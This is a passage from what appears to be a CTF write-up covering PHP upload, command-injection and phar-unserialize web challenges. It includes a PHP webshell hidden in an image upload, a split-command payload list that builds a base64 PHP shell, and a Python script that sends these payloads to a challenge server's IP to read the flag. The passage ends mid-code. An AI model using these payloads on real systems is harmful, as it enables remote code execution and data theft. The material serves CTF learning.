/><code></code></p><p>PS: <code>NewStarCTF2023</code></p><h2 id="can-can-need-shell"><a class="markdownIt-Anchor" href="#can-can-need-shell"></a>  can can need shell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>];</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; </span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="variable">$maxSize</span> = <span class="number">102400</span>; <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$maxSize</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="variable">$allowedExtensions</span> = [ <span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;php&#x27;</span>];</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>), <span class="variable">$allowedExtensions</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="variable">$checkExtensions</span> = [<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;php3&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>), <span class="variable">$checkExtensions</span>)) &#123;</span><br><span class="line">        <span class="variable">$dangerous</span> = <span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$uploadedFile</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$dangerous</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">                <span class="variable">$res</span> = <span class="title function_ invoke__">stristr</span>(<span class="variable">$line</span>,<span class="variable">$value</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$res</span> != <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;CNSS&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>, <span class="number">0755</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randomNumber</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>, <span class="number">10000</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="variable">$uploadPath</span> = <span class="variable">$uploadDir</span>  . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;CNSS&quot;</span>. <span class="variable">$randomNumber</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>)) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span> ;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadPath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27; &#x27;</span>. <span class="variable">$uploadPath</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TM</span><br><span class="line">[ <span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;php&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;php3&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>]<span class="string">&#x27;eval&#x27;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span></span><br><span class="line">bp</span><br><span class="line">cuevps</span><br><span class="line">png&lt;?php system(<span class="string">&quot;cat /flag&quot;</span>);?&gt;</span><br><span class="line">phpincludepng</span><br><span class="line">&lt;?php include <span class="string">&quot;/var/www/html/uploads/54f29efe821e25c44ac9858175a8af1f/7a91379285d4e81fb90af4c944ca289f.png&quot;</span>;?&gt;</span><br><span class="line">php</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POSTPOC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- action--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;vps&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploaded_file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>+</code></p><h2 id="7-ezrcccce"><a class="markdownIt-Anchor" href="#7-ezrcccce"></a> 7 EZRCCCCE</h2><p>7<a href="https://blog.csdn.net/nzjdsds/article/details/102873187">https://blog.csdn.net/nzjdsds/article/details/102873187</a><br /><code>payload.txt</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line"><span class="built_in">ls</span> -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://152.136.11.155:10109/?6=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\cnss\\web\payload.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://152.136.11.155:10109/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>payload</code><code>http://152.136.11.155:10109/1.php?1=system(&quot;cat /flag&quot;);</code></p><p><code>cnss&#123;y0u_Rea11y_kn0w_h0w_7o_k22p_fit&#125;</code><br /><code></code><br /><code>shell</code><code>bash</code>ban<code>nc</code></p><h2 id="where-is-my-unserialize"><a class="markdownIt-Anchor" href="#where-is-my-unserialize"></a>  where is my unserialize?</h2><p><code>unserialize</code><code>phar</code><br /><code>url/file.php?file=upload_file.php</code><code>function.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>;</span><br><span class="line"><span class="comment">//header(&quot;Content-type: text/html;charset=utf-8&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;!&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123;</span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h4&gt;:&quot;</span> . <span class="string">&quot;&lt;h4/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>base.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;CNSS&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span>&quot; <span class="title">role</span>=&quot;<span class="title">navigation</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">fluid</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbra</span>-<span class="title">toggle</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">file</span>.<span class="title">php</span>?<span class="title">file</span>=&quot;&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">upload_file</span>.<span class="title">php</span>&quot;&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">right</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">glyphicon</span> <span class="title">glyphicon</span>-<span class="title">user</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> (&#x27;<span class="title">hello</span>,&#x27;.$<span class="title">_SERVER</span>[&#x27;<span class="title">REMOTE_ADDR</span>&#x27;]);?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!--<span class="title">flag</span> <span class="title">is</span> <span class="title">in</span> <span class="title">f1ag</span>.<span class="title">php</span>--&gt;</span></span><br></pre></td></tr></table></figure><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;base.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>file.php</code><code>class.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shin0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shin0 = <span class="string">&#x27;cnss&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shin0 = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;shin0.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CN55</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_get</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$haha</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;</span>);</span><br><span class="line">        